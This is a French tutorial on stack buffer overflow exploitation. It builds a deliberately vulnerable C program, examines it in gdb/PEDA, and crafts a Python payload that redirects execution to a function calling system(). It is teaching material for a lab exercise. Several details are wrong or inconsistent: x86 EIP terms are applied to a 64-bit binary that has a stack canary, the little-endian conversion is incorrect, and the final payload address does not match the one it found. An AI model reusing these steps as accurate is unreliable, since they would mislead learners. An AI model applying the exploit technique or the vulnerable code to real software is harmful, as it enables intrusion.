# 2. Exploitation d'applications

## Buffer Overflow

Le type d'attaques le plus connu est le **buffer overflow**.

Les tampons (buffer) sont des zones de stockage de la mémoire qui retiennent temporairement les données pendant qu'elles sont transférées d'un endroit à un autre. Un débordement / dépassement de la mémoire tampon (buffer overflow) se produit lorsque le volume de données dépasse la capacité de stockage de la mémoire tampon. En conséquence, le programme qui tente d'écrire les données dans la mémoire tampon écrase les emplacements de mémoire adjacents.

Par exemple, une mémoire tampon pour les identifiants de connexion peut être conçue pour des entrées de nom d'utilisateur et de mot de passe de 8 octets, de sorte que si une transaction implique une entrée de 10 octets (c'est-à-dire 2 octets de plus que prévu), le programme peut écrire les données excédentaires au-delà de la limite de la mémoire tampon.

Les débordements de mémoire tampon peuvent affecter tous les types de logiciels. Ils résultent généralement d'entrées mal formées ou de l'impossibilité d'allouer suffisamment d'espace à la mémoire tampon. Si la transaction écrase le code exécutable, le programme peut se comporter de manière imprévisible et générer des résultats incorrects, des erreurs d'accès à la mémoire ou des plantages.

Nous utiliserons du `C` ainsi que de `l'assembleur`

EIP est un registre dans les architectures x86 (32 bits). C'est l'adresse qui nous dit où se situe la prochaine commande a executer. notre but durant cette attaque est d'en prendre le contrôle en dépassant la taille du programme pour réécrire cette adresse.

## Exemple

Nous utiliserons Linux.

Tout d'abord voici un code qui n'est pas vulnérable.

```c
#include <stdio.h>
#include <unistd.h>

int secure(){
 char buffer[200];
 int input;
 input = read(0, buffer, 200);
 printf("\n[+] user supplied: %d-bytes!", input);
 printf("\n[+] buffer content --> %s!", buffer);
 return 0;
}

int main(int argc, char * argv[]){
 secure();
 return 0;
}
```

Ici le buffer a la même taille que l'input. Il ne devrait donc pas y avoir de problèmes.

Nous pouvons tester d'envoyer plus que 200 caractères en utilisant python.

```console
$ python -c 'print("A" * 400)' | ./secure

[+] user supplied: 200-bytes!
[+] buffer content --> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
```

En effet, il n'y a aucun problèmes.

Nous allons maintenant voir un code qui est vulnérable.

```c
#include <stdio.h>
#include <unistd.h>

int overflow(){
	char buffer[200];
	int input;
	input = read(0, buffer, 400);
	printf("\n[+] you supplied: %d-bytes!", input);
	printf("\n[+] the contents of the buffer are --> %s", buffer);
	return 0;
}

int main(int argc, char * argv[]){
	overflow();
	return 0;
}
```

Ici, le buffer est plus petit que l'input. Il y a donc une vulnérabilité.

Nous pouvons le voir en utilisant python.

```console
$ python -c 'print("A" * 400)' | ./vulnerable

[+] you supplied: 400-bytes!
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

Il y a ce qu'on appelle une `segfault` (segmentation fault), un problème dans le programme.

Nous pouvons sauvegarder la sortie de la commande python pour faire de la rétro-ingénierie.

```bash
python -c 'print("A" * 400)' > input.txt
```

Nous allons utiliser gdb pour faire de la rétro-ingénierie sur `vulnerable`.
Nous allons installer [PEDA](https://github.com/longld/peda) afin de faciliter les choses.

Nous pouvons démarrer gdb.

```bash
gdb -q ./vulnerable
```

Nous sommes maintenant dans l'outil de gdb et nous pouvons désassemblé le fichier.

```console
gdb-peda$ info fonctions
Toutes les fonctions définies :

Symboles non débogués :
0x0000000000001000 _init
0x0000000000001060 __cxa_finalize@plt
0x0000000000001070 __stack_chk_fail@plt
0x000000001080 printf@plt
0x000000001090 read@plt
0x0000000010a0 _start
0x00000000000010d0 deregister_tm_clones
0x0000000000001100 register_tm_clones
0x0000000000001140 __do_global_dtors_aux
0x000000001180 frame_dummy
0x000000001189 overflow
0x000000001215 main
0x0000000000001240 __libc_csu_init
0x00000000000012b0 __libc_csu_fini
0x0000000012b8 _fini
```

Les 2 choses importantes ici sont `overflow` et `main`.
Maintenant, nous pouvons désassembler main.

```console
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000001215 <+0>:	endbr64 
   0x0000000000001219 <+4>:	push   rbp
   0x000000000000121a <+5>:	mov    rbp,rsp
   0x000000000000121d <+8>:	sub    rsp,0x10
   0x0000000000001221 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001224 <+15>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000001228 <+19>:	mov    eax,0x0
   0x000000000000122d <+24>:	call   0x1189 <overflow>
   0x0000000000001232 <+29>:	mov    eax,0x0
   0x0000000000001237 <+34>:	leave  
   0x0000000000001238 <+35>:	ret    
End of assembler dump.
```
Nous pouvons voir un appel à `overflow`.
Nous pouvons maintenant désassembler overflow.

```console
gdb-peda$ disas overflow
Dump of assembler code for function overflow:
   0x0000000000001189 <+0>:	endbr64 
   0x000000000000118d <+4>:	push   rbp
   0x000000000000118e <+5>:	mov    rbp,rsp
   0x0000000000001191 <+8>:	sub    rsp,0xe0
   0x0000000000001198 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x00000000000011a1 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000000011a5 <+28>:	xor    eax,eax
   0x00000000000011a7 <+30>:	lea    rax,[rbp-0xd0]
   0x00000000000011ae <+37>:	mov    edx,0x190
   0x00000000000011b3 <+42>:	mov    rsi,rax
   0x00000000000011b6 <+45>:	mov    edi,0x0
   0x00000000000011bb <+50>:	call   0x1090 <read@plt>
   0x00000000000011c0 <+55>:	mov    DWORD PTR [rbp-0xd4],eax
   0x00000000000011c6 <+61>:	mov    eax,DWORD PTR [rbp-0xd4]
   0x00000000000011cc <+67>:	mov    esi,eax
   0x00000000000011ce <+69>:	lea    rdi,[rip+0xe33]        # 0x2008
   0x00000000000011d5 <+76>:	mov    eax,0x0
   0x00000000000011da <+81>:	call   0x1080 <printf@plt>
   0x00000000000011df <+86>:	lea    rax,[rbp-0xd0]
   0x00000000000011e6 <+93>:	mov    rsi,rax
   0x00000000000011e9 <+96>:	lea    rdi,[rip+0xe38]        # 0x2028
   0x00000000000011f0 <+103>:	mov    eax,0x0
   0x00000000000011f5 <+108>:	call   0x1080 <printf@plt>
   0x00000000000011fa <+113>:	mov    eax,0x0
   0x00000000000011ff <+118>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001203 <+122>:	xor    rcx,QWORD PTR fs:0x28
   0x000000000000120c <+131>:	je     0x1213 <overflow+138>
   0x000000000000120e <+133>:	call   0x1070 <__stack_chk_fail@plt>
   0x0000000000001213 <+138>:	leave  
   0x0000000000001214 <+139>:	ret    
End of assembler dump.
```

Nous allons comparer ce code assembleur au code du fichier `vulnerable.c`, sinon cela prendrait trop de temps.

Nous pouvons maintenant essayer d'entrer le contenu du fichier input.txt.

```console
gdb-peda$ r < input.txt
Starting program: /home/remnux/Documents/bufferOverflow/vulnerable < input.txt

[+] you supplied: 400-bytes!
*** stack smashing detected ***: terminated

Program received signal SIGABRT, Aborted.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x7ffff7fb0540 (0x00007ffff7fb0540)
RCX: 0x7ffff7e0000b (<__GI_raise+203>:	mov    rax,QWORD PTR [rsp+0x108])
RDX: 0x0 
RSI: 0x7fffffffdae0 --> 0x0 
RDI: 0x2 
RBP: 0x7fffffffde60 --> 0x7ffff7f7408f ("*** %s ***: terminated\n")
RSP: 0x7fffffffdae0 --> 0x0 
RIP: 0x7ffff7e0000b (<__GI_raise+203>:	mov    rax,QWORD PTR [rsp+0x108])
R8 : 0x0 
R9 : 0x7fffffffdae0 --> 0x0 
R10: 0x8 
R11: 0x246 
R12: 0x7fffffffdd60 --> 0x7fffffffdf60 ('A' <repeats 200 times>...)
R13: 0x20 (' ')
R14: 0x7ffff7ffb000 --> 0x202a2a2a00001000 
R15: 0x1
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7dfffff <__GI_raise+191>:	mov    edi,0x2
   0x7ffff7e00004 <__GI_raise+196>:	mov    eax,0xe
   0x7ffff7e00009 <__GI_raise+201>:	syscall 
=> 0x7ffff7e0000b <__GI_raise+203>:	mov    rax,QWORD PTR [rsp+0x108]
   0x7ffff7e00013 <__GI_raise+211>:	xor    rax,QWORD PTR fs:0x28
   0x7ffff7e0001c <__GI_raise+220>:	jne    0x7ffff7e00044 <__GI_raise+260>
   0x7ffff7e0001e <__GI_raise+222>:	mov    eax,r8d
   0x7ffff7e00021 <__GI_raise+225>:	add    rsp,0x118
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdae0 --> 0x0 
0008| 0x7fffffffdae8 --> 0x7ffff7faf520 --> 0x7ffff7ffe190 --> 0x555555554000 --> 0x10102464c457f 
0016| 0x7fffffffdaf0 --> 0x3 
0024| 0x7fffffffdaf8 --> 0x0 
0032| 0x7fffffffdb00 --> 0x0 
0040| 0x7fffffffdb08 --> 0x0 
0048| 0x7fffffffdb10 --> 0x0 
0056| 0x7fffffffdb18 --> 0x677f9a5f 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGABRT
__GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
50	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
```

Comme prévu, nous avons un Segfault.
Nous allons maintenant placer un point d'arrêt pour évaluer le programme ainsi que ces registres a différents moments

```console
gdb-peda$ disas overflow 
Dump of assembler code for function overflow:
   0x0000555555555189 <+0>:	endbr64 
   0x000055555555518d <+4>:	push   rbp
   0x000055555555518e <+5>:	mov    rbp,rsp
   0x0000555555555191 <+8>:	sub    rsp,0xe0
   0x0000555555555198 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x00005555555551a1 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x00005555555551a5 <+28>:	xor    eax,eax
   0x00005555555551a7 <+30>:	lea    rax,[rbp-0xd0]
   0x00005555555551ae <+37>:	mov    edx,0x190
   0x00005555555551b3 <+42>:	mov    rsi,rax
   0x00005555555551b6 <+45>:	mov    edi,0x0
   0x00005555555551bb <+50>:	call   0x555555555090 <read@plt>
   0x00005555555551c0 <+55>:	mov    DWORD PTR [rbp-0xd4],eax
   0x00005555555551c6 <+61>:	mov    eax,DWORD PTR [rbp-0xd4]
   0x00005555555551cc <+67>:	mov    esi,eax
   0x00005555555551ce <+69>:	lea    rdi,[rip+0xe33]        # 0x555555556008
   0x00005555555551d5 <+76>:	mov    eax,0x0
   0x00005555555551da <+81>:	call   0x555555555080 <printf@plt>
   0x00005555555551df <+86>:	lea    rax,[rbp-0xd0]
   0x00005555555551e6 <+93>:	mov    rsi,rax
   0x00005555555551e9 <+96>:	lea    rdi,[rip+0xe38]        # 0x555555556028
   0x00005555555551f0 <+103>:	mov    eax,0x0
   0x00005555555551f5 <+108>:	call   0x555555555080 <printf@plt>
   0x00005555555551fa <+113>:	mov    eax,0x0
   0x00005555555551ff <+118>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x0000555555555203 <+122>:	xor    rcx,QWORD PTR fs:0x28
   0x000055555555520c <+131>:	je     0x555555555213 <overflow+138>
   0x000055555555520e <+133>:	call   0x555555555070 <__stack_chk_fail@plt>
   0x0000555555555213 <+138>:	leave  
   0x0000555555555214 <+139>:	ret    
End of assembler dump.
gdb-peda$ b *0x00005555555551b6
Breakpoint 1 at 0x5555555551b6
gdb-peda$ b *0x00005555555551c0
Breakpoint 2 at 0x5555555551c0
gdb-peda$ b *0x0000555555555214
Breakpoint 3 at 0x555555555214
```

Exécutons maintenant le programme.

```console
gdb-peda$ r
Starting program: /home/remnux/Documents/bufferOverflow/vulnerable < input.txt
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdeb0 --> 0x0 
RBX: 0x555555555240 (<__libc_csu_init>:	endbr64)
RCX: 0x555555555240 (<__libc_csu_init>:	endbr64)
RDX: 0x190 
RSI: 0x7fffffffdeb0 --> 0x0 
RDI: 0x1 
RBP: 0x7fffffffdf80 --> 0x7fffffffdfa0 --> 0x0 
RSP: 0x7fffffffdea0 --> 0x0 
RIP: 0x5555555551b6 (<overflow+45>:	mov    edi,0x0)
R8 : 0x0 
R9 : 0x7ffff7fe0d60 (<_dl_fini>:	endbr64)
R10: 0x7ffff7ffcf68 --> 0x6ffffff0 
R11: 0x206 
R12: 0x5555555550a0 (<_start>:	endbr64)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555551a7 <overflow+30>:	lea    rax,[rbp-0xd0]
   0x5555555551ae <overflow+37>:	mov    edx,0x190
   0x5555555551b3 <overflow+42>:	mov    rsi,rax
=> 0x5555555551b6 <overflow+45>:	mov    edi,0x0
   0x5555555551bb <overflow+50>:	call   0x555555555090 <read@plt>
   0x5555555551c0 <overflow+55>:	mov    DWORD PTR [rbp-0xd4],eax
   0x5555555551c6 <overflow+61>:	mov    eax,DWORD PTR [rbp-0xd4]
   0x5555555551cc <overflow+67>:	mov    esi,eax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea0 --> 0x0 
0008| 0x7fffffffdea8 --> 0x0 
0016| 0x7fffffffdeb0 --> 0x0 
0024| 0x7fffffffdeb8 --> 0x0 
0032| 0x7fffffffdec0 --> 0x0 
0040| 0x7fffffffdec8 --> 0x0 
0048| 0x7fffffffded0 --> 0x0 
0056| 0x7fffffffded8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005555555551b6 in overflow ()
```

Nous pouvons voir dans la section de code que nous sommes actuellement à l'intérieur de la fonction `overflow`. Nous pouvons nous en rendre compte en examinant quelques adresses du registre **`EIP`**.

```console
gdb-peda$ x/8iw $eip

=> 0x5555555551b6 <overflow+45>:	mov    edi,0x0
   0x5555555551bb <overflow+50>:	call   0x555555555090 <read@plt>
   0x5555555551c0 <overflow+55>:	mov    DWORD PTR [rbp-0xd4],eax
   0x5555555551c6 <overflow+61>:	mov    eax,DWORD PTR [rbp-0xd4]
   0x5555555551cc <overflow+67>:	mov    esi,eax

```

Bien, cela ressemble à la fonction de débordement et si nous nous rappelons, notre entrée sera stockée dans la variable tampon qui est située à l'adresse **`[ebp-0xd4]`**. Nous pouvons trouver l'adresse de cette région avec la commande suivante.

```console
gdb-peda$ p $ebp-0x200
$1 = 0xffffdd80
```

```
gdb-peda$ x/12ix 0xffffdd80
0xffffdd80:     0x00000000     0x00000000     0x00000340     0x00000340
0xffffdd90:     0x00000340     0x00000340     0x00000340     0x00000340
0xffffde00:     0x00000340     0x00000000     0x00000000     0x00000100
```

C'est la qu'est stocké l'adresse EIP que nous cherchons a manipuler.

Si nous poursuivons l'exécution du programme en utilisant **`c`**, nous pouvons alors réexaminer ce bloc de mémoire et nous devrions voir tous les `A`.

```
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
RAX: 0x190 
RBX: 0x555555555240 (<__libc_csu_init>:	endbr64)
RCX: 0x7ffff7ecafd2 (<__GI___libc_read+18>:	cmp    rax,0xfffffffffffff000)
RDX: 0x190 
RSI: 0x7fffffffdeb0 ('A' <repeats 200 times>...)
RDI: 0x0 
RBP: 0x7fffffffdf80 ('A' <repeats 192 times>, "\220\341\377\367\377\177")
RSP: 0x7fffffffdea0 --> 0x0 
RIP: 0x5555555551c0 (<overflow+55>:	mov    DWORD PTR [rbp-0xd4],eax)
R8 : 0x0 
R9 : 0x7ffff7fe0d60 (<_dl_fini>:	endbr64)
R10: 0x7ffff7ffcf68 --> 0x6ffffff0 
R11: 0x246 
R12: 0x5555555550a0 (<_start>:	endbr64)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555551b3 <overflow+42>:	mov    rsi,rax
   0x5555555551b6 <overflow+45>:	mov    edi,0x0
   0x5555555551bb <overflow+50>:	call   0x555555555090 <read@plt>
=> 0x5555555551c0 <overflow+55>:	mov    DWORD PTR [rbp-0xd4],eax
   0x5555555551c6 <overflow+61>:	mov    eax,DWORD PTR [rbp-0xd4]
   0x5555555551cc <overflow+67>:	mov    esi,eax
   0x5555555551ce <overflow+69>:	lea    rdi,[rip+0xe33]        # 0x555555556008
   0x5555555551d5 <overflow+76>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea0 --> 0x0 
0008| 0x7fffffffdea8 --> 0x0 
0016| 0x7fffffffdeb0 ('A' <repeats 200 times>...)
0024| 0x7fffffffdeb8 ('A' <repeats 200 times>...)
0032| 0x7fffffffdec0 ('A' <repeats 200 times>...)
0040| 0x7fffffffdec8 ('A' <repeats 200 times>...)
0048| 0x7fffffffded0 ('A' <repeats 200 times>...)
0056| 0x7fffffffded8 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x00005555555551c0 in overflow ()
```

```console

gdb-peda$ x/36wx $ebp-0xd4
0x7fffffffdeb0:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdec0:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffded0:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdee0:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdef0:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdf00:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdf10:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdf20:     0x41414141     0x41414141     0x41414141     0x41414141
0x7fffffffdf30:     0x41414141     0x41414141     0x41414141     0x41414141
```

Les A, se répètent bien. Allons donc jusqu'au bous de l'execution du programme.

```console
gdb-peda$ c
Continuing.

[+] you supplied: 1-bytes!
[+] the contents of the buffer are --> 
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x555555555240 (<__libc_csu_init>:	endbr64)
RCX: 0x0 
RDX: 0x0 
RSI: 0x555555556052 --> 0x483b031b010000 
RDI: 0x7ffff7fab7e0 --> 0x0 
RBP: 0x7fffffffdfa0 --> 0x0 
RSP: 0x7fffffffdf88 --> 0x555555555232 (<main+29>:	mov    eax,0x0)
RIP: 0x555555555214 (<overflow+139>:	ret)
R8 : 0x0 
R9 : 0x29 (')')
R10: 0x555555556052 --> 0x483b031b010000 
R11: 0x246 
R12: 0x5555555550a0 (<_start>:	endbr64)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf88 --> 0x555555555232 (<main+29>:	mov    eax,0x0)
0008| 0x7fffffffdf90 --> 0x7fffffffe098 --> 0x7fffffffe3a0 ("/home/remnux/Documents/bufferOverflow/vulnerable")
0016| 0x7fffffffdf98 --> 0x100000000 
0024| 0x7fffffffdfa0 --> 0x0 
0032| 0x7fffffffdfa8 --> 0x7ffff7de1083 (<__libc_start_main+243>:	mov    edi,eax)
0040| 0x7fffffffdfb0 --> 0x50 ('P')
0048| 0x7fffffffdfb8 --> 0x7fffffffe098 --> 0x7fffffffe3a0 ("/home/remnux/Documents/bufferOverflow/vulnerable")
0056| 0x7fffffffdfc0 --> 0x1f7fa57a0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x0000555555555214 in overflow ()
```
`Invalid $PC address: 0x41414141` nous montre l'adresse que le programme tente de charger.

Nous pouvons utiliser un outils de gdb permettant de créer des paternes pour retrouver le décalage de l'adresse EIP.

```console
gdb-peda$ pattern create 600 pattern.txt
Writing pattern of 600 chars to filename "pattern.txt"
```

Après la création de ce paterne, nous devons le fournir au programme pour trouver ce décalage.

```console
gdb-peda$ r < pattern.txt
[...]
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x4325416e
[------------------------------------stack-------------------------------------]
[...]
```

Nous avons trouvé le décalage dans le motif, il suffit donc de le fournir à l'outil gdb `pattern offset`.

```console
gdb-peda$ pattern offset 0x4325416e
1126515054 found at offset: 216
```

Nous pouvons maintenant créer notre "payload" en utilisant python dans le shell par défaut, juste comme preuve de concept.

```bash
python -c 'print("A" * 216 + "B" * 4 + "C" * 180)' > offset.txt
```

Si nous exécutons à nouveau le code, nous devrions constater que l'adresse EIP est remplie de B.

```console
gdb-peda$ r < offset.txt
[...]
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
[...]
```

0x42 est la valeur hexadécimale de B. Nous avons maintenant le décalage, mais rien à pirater. Nous allons donc réécrire notre code vulnérable.

```C
#include <stdio.h>
#include <unistd.h>

int hackme(){
  system("touch hacked.txt")
}

int secure(){
  char buffer[200];
  int input;
  input = read(0, buffer, 400);
  printf("\n[+] user supplied: %d-bytes!", input);
  printf("\n[+] buffer content --> %s!", buffer);
  return 0;
}

int main(int argc, char * argv[]){
  secure();
  return 0;
}
```

Le code comprend maintenant une fonction de démonstration que nous devrons exécuter.

Nous pouvons la compiler.

Si nous retournons dans gdb, nous pouvons trouver l'adresse de la fonction `hackme` pour la mettre à la place de l'adresse EIP que nous pouvons maintenant contrôler.

```console
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001070  __cxa_finalize@plt
0x0000000000001080  __stack_chk_fail@plt
0x0000000000001090  system@plt
0x00000000000010a0  printf@plt
0x00000000000010b0  read@plt
0x00000000000010c0  _start
0x00000000000010f0  deregister_tm_clones
0x0000000000001120  register_tm_clones
0x0000000000001160  __do_global_dtors_aux
0x00000000000011a0  frame_dummy
0x00000000000011a9  hackme
0x00000000000011c5  secure
0x0000000000001251  main
0x0000000000001280  __libc_csu_init
0x00000000000012f0  __libc_csu_fini
0x00000000000012f8  _fini
```

Nous pouvons maintenant rechercher son adresse.

```console
gdb-peda$ p hackme
$1 = {<text variable, no debug info>} 0x11a9 <hackme>
```

`0x11a9` est au format petit-boutiste, nous devons donc inverser son ordre.

0x11a9 -> 0xa911

Nous pouvons maintenant écrire notre code d'exploitation en utilisant Python.

```bash
python2 -c 'print("A" * 216 + "\x76\x91\x04\x08" + "C" * 180)' > exploit.txt
```

Nous pouvons maintenant utiliser ce code.

```console
gdb-peda$ r < exploit.txt
```

Si vous vérifiez vos fichiers, vous devriez voir hacked.txt.
C'est tout pour la partie débordement de tampon.
